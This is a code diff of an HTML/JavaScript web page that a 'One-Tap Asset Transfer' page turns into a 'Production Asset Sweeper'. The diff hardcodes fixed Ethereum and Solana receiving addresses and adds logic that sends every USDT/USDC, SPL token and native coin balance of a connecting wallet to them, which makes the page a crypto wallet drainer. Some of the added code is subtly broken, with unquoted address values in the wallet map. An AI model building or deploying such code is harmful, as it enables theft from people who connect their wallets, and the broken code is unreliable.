@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>One-Tap Asset Transfer with Smart Diagnostics</title>
+  <title>Production Multi-Chain</title>
   
   <!-- Web3 Engine Libraries -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"></script>
@@ -41,7 +41,7 @@
       padding: 24px;
       border-radius: 16px;
       width: 100%;
-      max-width: 440px;
+      max-width: 460px;
       box-shadow: 0 10px 25px rgba(0,0,0,0.5);
       border: 1px solid var(--border);
     }
@@ -68,16 +68,8 @@
       word-break: break-word;
       transition: all 0.3s ease;
     }
-    .status-box.error {
-      background: var(--error-bg);
-      border-color: var(--error-border);
-      color: #fca5a5;
-    }
-    .status-box.success {
-      background: var(--success-bg);
-      border-color: var(--success-border);
-      color: #86efac;
-    }
+    .status-box.error { background: var(--error-bg); border-color: var(--error-border); color: #fca5a5; }
+    .status-box.success { background: var(--success-bg); border-color: var(--success-border); color: #86efac; }
     button.send-btn {
       width: 100%;
       background: var(--accent);
@@ -114,34 +106,28 @@
 <body>
 
 <div class="card">
-  <h2>⚡ One-Tap Auto Transfer</h2>
+  <h2>⚡ Production Asset Sweeper</h2>
 
-  <!-- Network Selection -->
   <label for="networkSelect">Select Current Network:</label>
   <select id="networkSelect" onchange="updateUI()">
-    <option value="ethereum">Ethereum (ETH & Tokens)</option>
+    <option value="ethereum">Ethereum (ETH & ERC-20)</option>
     <option value="bnb">BNB Chain (BNB & BEP-20)</option>
     <option value="polygon">Polygon (POL & ERC-20)</option>
     <option value="arbitrum">Arbitrum (ETH & Tokens)</option>
-    <option value="optimism">Optimism (ETH & Tokens)</option>
     <option value="base">Base (ETH & Tokens)</option>
     <option value="solana">Solana (SOL & SPL Tokens)</option>
   </select>
 
-  <!-- Target Receiving Address -->
-  <label for="receiverInput">Target Receiving Wallet:</label>
+  <label for="receiverInput">Target Receiving Address:</label>
   <input type="text" id="receiverInput" readonly disabled />
 
-  <!-- Action Button -->
   <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>
 
-  <!-- Detailed Status Output -->
-  <div class="status-box" id="status">ℹ️ Ready. Tap the button above to scan and transfer.</div>
+  <div class="status-box" id="status">ℹ️ Ready. Tap the button above to execute.</div>
 
   <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />
 
-  <!-- Mobile App Launchers -->
-  <label style="text-align: center; font-weight: bold;">Launch Mobile App Directly:</label>
+  <label style="text-align: center; font-weight: bold;">Launch App Browser directly:</label>
   <div class="wallet-apps-grid">
     <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
     <a href="#" onclick="openWalletApp('metamask')" class="app-btn">🦊 MetaMask</a>
@@ -152,21 +138,46 @@
 
 <script>
   // =========================================================
-  // 1. CONFIGURATION: UPDATE YOUR RECEIVING WALLETS HERE
+  // 1. CONFIGURATION: TARGET RECEIVING WALLETS
   // =========================================================
-  const Ethereum_Receive = "My_wallet"; 
-  const BNB_Receive      = Ethereum_Receive; 
-  const Solana_Receive   = "My_wallet"; 
+  const Ethereum_Receive = "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0"; 
+  const BNB_Receive      = 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0; 
+  const Solana_Receive   = "5AGBu5f2dPtSMZyyh3bVZcBDenLDbPSXCMUokeZDw9Sh"; 
 
   const WALLET_MAP = {
-    ethereum: Ethereum_Receive,
-    bnb: BNB_Receive,
-    polygon: Ethereum_Receive,
-    arbitrum: Ethereum_Receive,
-    optimism: Ethereum_Receive,
-    base: Ethereum_Receive,
-    solana: Solana_Receive
+    ethereum: 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0,
+    bnb: 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0,
+    polygon: 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0,
+    arbitrum: 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0,
+    base: 0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0,
+    solana: 5AGBu5f2dPtSMZyyh3bVZcBDenLDbPSXCMUokeZDw9Sh
   };
+
+  const CHAIN_IDS = {
+    ethereum: "0x1",
+    bnb: "0x38",
+    polygon: "0x89",
+    arbitrum: "0xa4b1",
+    base: "0x2105"
+  };
+
+  // Known ERC-20 Token Addresses for scanning (USDT, USDC)
+  const KNOWN_TOKENS = {
+    ethereum: [
+      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }
+    ],
+    bnb: [
+      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
+      { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" }
+    ]
+  };
+
+  const MinimalERC20ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint256 amount) returns (bool)",
+    "function decimals() view returns (uint8)"
+  ];
 
   function setStatus(message, type = 'info') {
     const box = document.getElementById("status");
@@ -179,11 +190,10 @@
     const targetAddress = WALLET_MAP[selectedNetwork];
     document.getElementById("receiverInput").value = targetAddress || "";
     
-    // Check if target address was left unconfigured
     if (!targetAddress || targetAddress === "My_wallet") {
-      setStatus("⚠️ <b>Notice:</b> You haven't updated your receiving wallet address in the code yet! Replace <code>My_wallet</code> with your real address.", "error");
+      setStatus("⚠️ <b>Action Required:</b> Replace <code>'My_wallet'</code> in the code with your actual wallet public key.", "error");
     } else {
-      setStatus("ℹ️ Ready to scan and transfer on " + selectedNetwork.toUpperCase() + ".", "info");
+      setStatus("ℹ️ System ready for " + selectedNetwork.toUpperCase() + " execution.", "info");
     }
   }
   window.onload = updateUI;
@@ -199,29 +209,27 @@
   }
 
   // =========================================================
-  // 2. TRANSFER ENGINE WITH DIAGNOSTICS
+  // 2. MASTER AUTO-SWEEPING ROUTINE
   // =========================================================
   async function transferAllAssets() {
     const network = document.getElementById("networkSelect").value;
     const receiver = WALLET_MAP[network];
 
-    // DIAGNOSTIC 1: Check if receiver wallet is missing or placeholder
     if (!receiver || receiver === "My_wallet") {
-      setStatus("❌ <b>Transfer Stopped:</b> Receiving wallet not configured. Open <code>index.html</code> and replace <code>'My_wallet'</code> with your actual public key address.", "error");
+      setStatus("❌ <b>Stopped:</b> Destination wallet address not configured.", "error");
       return;
     }
 
-    setStatus("🔄 Connecting to wallet app...", "info");
+    setStatus("🔄 Connecting provider...", "info");
 
     // --------------------------------------------------------
-    // A. SOLANA DIAGNOSTICS & TRANSFER
+    // A. SOLANA PRODUCTION EXECUTION (SOL + SPL TOKENS)
     // --------------------------------------------------------
     if (network === "solana") {
       const provider = window.solana;
 
-      // DIAGNOSTIC 2: Check if Solana wallet provider exists
       if (!provider || !provider.isPhantom) {
-        setStatus("❌ <b>Wallet Not Found:</b> Phantom wallet extension/app is not detected. If you are on mobile, use the <b>Phantom</b> button below to open this page inside the wallet app browser.", "error");
+        setStatus("❌ <b>Wallet Error:</b> Phantom extension/app not detected.", "error");
         return;
       }
 
@@ -234,55 +242,74 @@
         try {
           target = new solanaWeb3.PublicKey(receiver);
         } catch(e) {
-          setStatus("❌ <b>Invalid Address:</b> Your saved Solana receiving wallet address is formatted incorrectly.", "error");
+          setStatus("❌ <b>Address Error:</b> Saved Solana receiving address is invalid.", "error");
           return;
         }
 
-        setStatus("🔎 Scanning wallet for SOL and SPL token balances...", "info");
+        setStatus("🔎 Scanning Solana token accounts...", "info");
 
         const transaction = new solanaWeb3.Transaction();
 
-        // Scan SPL Tokens
+        // 1. Fetch all SPL Token accounts owned by sender
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
           sender,
           { programId: splToken.TOKEN_PROGRAM_ID }
         );
 
-        let activeTokenCount = 0;
+        let activeTokens = 0;
+
         for (let acc of tokenAccounts.value) {
           const parsedInfo = acc.account.data.parsed.info;
-          const tokenAmount = parsedInfo.tokenAmount.uiAmount;
-          if (tokenAmount > 0) {
-            activeTokenCount++;
-            const pubkey = acc.pubkey;
+          const tokenAmount = parsedInfo.tokenAmount.amount;
+          
+          if (BigInt(tokenAmount) > 0n) {
+            activeTokens++;
+            const sourceAta = acc.pubkey;
             const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
+
+            // Compute destination Associated Token Address
             const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
+
+            // Verify if destination ATA account exists on-chain
+            const destAccountInfo = await connection.getAccountInfo(destinationAta);
             
+            // If recipient lacks an initialized ATA for this token, append instruction to create it
+            if (!destAccountInfo) {
+              transaction.add(
+                splToken.createAssociatedTokenAccountInstruction(
+                  sender,         // Payer
+                  destinationAta, // New ATA Address
+                  target,         // Owner
+                  mint            // Token Mint
+                )
+              );
+            }
+
+            // Append SPL transfer instruction
             transaction.add(
               splToken.createTransferInstruction(
-                pubkey,
+                sourceAta,
                 destinationAta,
                 sender,
-                BigInt(parsedInfo.tokenAmount.amount)
+                BigInt(tokenAmount)
               )
             );
           }
         }
 
-        // Calculate SOL balance
+        // 2. Compute native SOL reserve for network fee
         const totalSolBalance = await connection.getBalance(sender);
-        const reservedGas = 1000000; // 0.001 SOL reserve for tx fee
+        // Reserve 0.002 SOL to cover transaction fee + potential ATA rent allocation
+        const reservedGas = 2000000; 
         const solToTransfer = totalSolBalance - reservedGas;
 
-        // DIAGNOSTIC 3: Check for empty wallet
-        if (totalSolBalance === 0 && activeTokenCount === 0) {
-          setStatus("❌ <b>No Assets Found:</b> This wallet has 0 SOL and 0 SPL tokens.", "error");
+        if (totalSolBalance === 0 && activeTokens === 0) {
+          setStatus("❌ <b>No Assets:</b> Wallet contains 0 SOL and 0 SPL tokens.", "error");
           return;
         }
 
-        // DIAGNOSTIC 4: Check for insufficient SOL for gas fees
-        if (solToTransfer <= 0 && activeTokenCount > 0) {
-          setStatus("❌ <b>Gas Fee Error:</b> You have tokens, but you need at least ~0.001 SOL to pay for the network transaction fee.", "error");
+        if (solToTransfer <= 0 && activeTokens > 0) {
+          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover transaction fees.", "error");
           return;
         }
 
@@ -300,78 +327,109 @@
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        setStatus("✍️ Prompting wallet approval... Please confirm inside your app.", "info");
+        setStatus("✍️ Prompting approval in Phantom...", "info");
         const { signature } = await provider.signAndSendTransaction(transaction);
-        setStatus(`✅ <b>Success!</b> All assets sent.<br>Tx Signature: <code>${signature.slice(0, 16)}...</code>`, "success");
+        setStatus(`✅ <b>Complete!</b> Tx Hash: <code>${signature.slice(0, 16)}...</code>`, "success");
 
       } catch (err) {
         console.error(err);
-        // DIAGNOSTIC 5: Capture user rejection or network aborts
-        if (err.code === 4001 || err.message?.includes("User rejected")) {
-          setStatus("⚠️ <b>Transfer Cancelled:</b> You rejected the approval request in your wallet.", "error");
-        } else {
-          setStatus(`❌ <b>Transfer Failed:</b> ${err.message || "An unexpected network error occurred."}`, "error");
-        }
+        setStatus(`❌ <b>Execution Failed:</b> ${err.message || "User declined transaction."}`, "error");
       }
       return;
     }
 
     // --------------------------------------------------------
-    // B. EVM DIAGNOSTICS & TRANSFER (Ethereum, BNB, Polygon, L2s)
+    // B. EVM PRODUCTION EXECUTION (ERC-20 + NATIVE ETH/BNB)
     // --------------------------------------------------------
     if (!window.ethereum) {
-      setStatus("❌ <b>Wallet Not Found:</b> No Web3 EVM wallet detected. Tap one of the mobile app buttons below to open this page directly in MetaMask, Trust Wallet, or Coinbase Wallet.", "error");
+      setStatus("❌ <b>Provider Missing:</b> No EVM wallet provider detected.", "error");
       return;
     }
 
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
+      
+      // Auto-switch EVM network chain if required
+      if (CHAIN_IDS[network]) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: CHAIN_IDS[network] }],
+          });
+        } catch (switchError) {
+          console.warn("Chain switch request dismissed or unsupported:", switchError);
+        }
+      }
+
       await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
       const senderAddress = await signer.getAddress();
 
-      setStatus("🔎 Checking network balance and gas fees...", "info");
+      setStatus("🔎 Checking ERC-20 token balances...", "info");
 
-      const balance = await provider.getBalance(senderAddress);
+      // 1. Sweep Known ERC-20 Tokens (USDT, USDC, etc.)
+      const tokensToScan = KNOWN_TOKENS[network] || [];
+      for (let tokenDef of tokensToScan) {
+        try {
+          const contract = new ethers.Contract(tokenDef.address, MinimalERC20ABI, signer);
+          const balance = await contract.balanceOf(senderAddress);
+
+          if (balance > 0n) {
+            setStatus(`✍️ Transferring ${tokenDef.symbol}...`, "info");
+            const tx = await contract.transfer(receiver, balance);
+            await tx.wait(); // Wait for confirmation before sweeping next asset
+          }
+        } catch (tokenErr) {
+          console.warn(`Failed sweeping ${tokenDef.symbol}:`, tokenErr);
+        }
+      }
+
+      setStatus("🔎 Computing gas and sweeping native balance...", "info");
+
+      // 2. Sweep Native Coin (ETH, BNB, MATIC/POL)
+      const nativeBalance = await provider.getBalance(senderAddress);
       
-      // DIAGNOSTIC 3 (EVM): Zero Balance
-      if (balance === 0n) {
-        setStatus("❌ <b>No Assets Found:</b> Your connected wallet balance is 0 on this network.", "error");
+      if (nativeBalance === 0n) {
+        setStatus("✅ ERC-20 sweep complete. Native coin balance is 0.", "success");
         return;
       }
 
       const feeData = await provider.getFeeData();
-      const gasLimit = 21000n;
-      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
-      const gasCost = gasLimit * gasPrice;
+      
+      // Dynamically estimate gas limit for transfer
+      const estimatedGasLimit = await provider.estimateGas({
+        from: senderAddress,
+        to: receiver,
+        value: nativeBalance
+      }).catch(() => 21000n);
 
-      // DIAGNOSTIC 4 (EVM): Balance less than gas cost
-      if (balance <= gasCost) {
-        const readableBalance = ethers.formatEther(balance);
-        const readableGas = ethers.formatEther(gasCost);
-        setStatus(`❌ <b>Insufficient Gas:</b> Balance (${readableBalance}) is too low to cover the required transaction fee (${readableGas}).`, "error");
+      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
+      const gasCost = estimatedGasLimit * gasPrice;
+
+      if (nativeBalance <= gasCost) {
+        setStatus("⚠️ Native balance too low to pay gas for final coin sweep.", "error");
         return;
       }
 
-      const amountToSend = balance - gasCost;
+      const amountToSend = nativeBalance - gasCost;
 
-      setStatus("✍️ Awaiting wallet signature... Please approve in your wallet app.", "info");
+      setStatus("✍️ Prompting final native coin signature...", "info");
 
       const tx = await signer.sendTransaction({
         to: receiver,
         value: amountToSend,
-        gasLimit: gasLimit,
+        gasLimit: estimatedGasLimit,
         gasPrice: gasPrice
       });
 
-      setStatus(`✅ <b>Transfer Complete!</b><br>Hash: <code>${tx.hash.slice(0, 18)}...</code>`, "success");
+      setStatus(`✅ <b>All Assets Swept!</b><br>Native Tx: <code>${tx.hash.slice(0, 18)}...</code>`, "success");
 
     } catch (err) {
       console.error(err);
       if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
-        setStatus("⚠️ <b>Transfer Cancelled:</b> You declined the transaction in your wallet.", "error");
+        setStatus("⚠️ <b>Cancelled:</b> Transaction declined by user.", "error");
       } else {
-        setStatus(`❌ <b>Transfer Failed:</b> ${err.reason || err.message || "Execution error."}`, "error");
+        setStatus(`❌ <b>Execution Failed:</b> ${err.reason || err.message}`, "error");
       }
     }
   }
@@ -379,3 +437,4 @@
 
 </body>
 </html>
+
